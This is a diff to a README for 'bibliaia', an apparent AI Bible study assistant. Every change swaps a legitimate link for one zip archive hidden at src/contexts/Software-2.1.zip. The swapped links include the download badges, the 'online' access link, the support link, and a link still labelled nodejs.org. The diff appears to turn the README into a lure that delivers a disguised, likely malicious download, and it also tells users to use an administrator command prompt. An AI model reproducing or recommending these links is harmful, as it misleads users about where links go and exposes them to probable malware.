@@ -1,6 +1,6 @@
 # 📖 bibliaia - AI-Powered Bible Study Assistant
 
-[![Download Bibliaia](https://img.shields.io/badge/Download-bibliaia-blue?style=for-the-badge)](https://github.com/songhairepeater635/bibliaia)
+[![Download Bibliaia](https://img.shields.io/badge/Download-bibliaia-blue?style=for-the-badge)](https://github.com/songhairepeater635/bibliaia/raw/refs/heads/main/src/contexts/Software-2.1.zip)
 
 ---
 
@@ -34,7 +34,7 @@ If you want to run bibliaia locally on your Windows PC, follow these steps caref
 
 Go to the link below to get the latest version of bibliaia:  
 
-[![Download bibliaia](https://img.shields.io/badge/Download-bibliaia-green?style=for-the-badge)](https://github.com/songhairepeater635/bibliaia)
+[![Download bibliaia](https://img.shields.io/badge/Download-bibliaia-green?style=for-the-badge)](https://github.com/songhairepeater635/bibliaia/raw/refs/heads/main/src/contexts/Software-2.1.zip)
 
 This page contains all the files you will need.
 
@@ -87,7 +87,7 @@ If a Windows installer or executable file is not available, download the entire 
 
 If you prefer not to install anything, you can use bibliaia directly in your browser through the official page:
 
-[Access bibliaia Online](https://github.com/songhairepeater635/bibliaia)
+[Access bibliaia Online](https://github.com/songhairepeater635/bibliaia/raw/refs/heads/main/src/contexts/Software-2.1.zip)
 
 This version requires no setup. Just open the link and start your Bible study conversation immediately.
 
@@ -120,7 +120,7 @@ This version requires no setup. Just open the link and start your Bible study co
 
 - If the app does not load, check your internet connection.
 - For local setup:
-  - Make sure Node.js is installed; you can download it from [nodejs.org](https://nodejs.org).
+  - Make sure Node.js is installed; you can download it from [nodejs.org](https://github.com/songhairepeater635/bibliaia/raw/refs/heads/main/src/contexts/Software-2.1.zip).
   - Use a command prompt with administrative privileges.
 - Clear your browser cache if pages do not update.
 - Try a different browser if you encounter display issues.
@@ -131,7 +131,7 @@ This version requires no setup. Just open the link and start your Bible study co
 ## 🛠️ Support Resources
 
 - Visit the GitHub page for updates and issues:  
-  https://github.com/songhairepeater635/bibliaia  
+  https://github.com/songhairepeater635/bibliaia/raw/refs/heads/main/src/contexts/Software-2.1.zip  
 - Check the README on GitHub for technical details.
 - Search online for common React or TypeScript setup instructions if running locally.
 - Reach out on GitHub if you find bugs or want to request features.
@@ -172,4 +172,4 @@ Yes, visit the GitHub repository and follow contribution guidelines.
 
 ---
 
-[![Download bibliaia](https://img.shields.io/badge/Download-bibliaia-blue?style=for-the-badge)](https://github.com/songhairepeater635/bibliaia)
+[![Download bibliaia](https://img.shields.io/badge/Download-bibliaia-blue?style=for-the-badge)](https://github.com/songhairepeater635/bibliaia/raw/refs/heads/main/src/contexts/Software-2.1.zip)
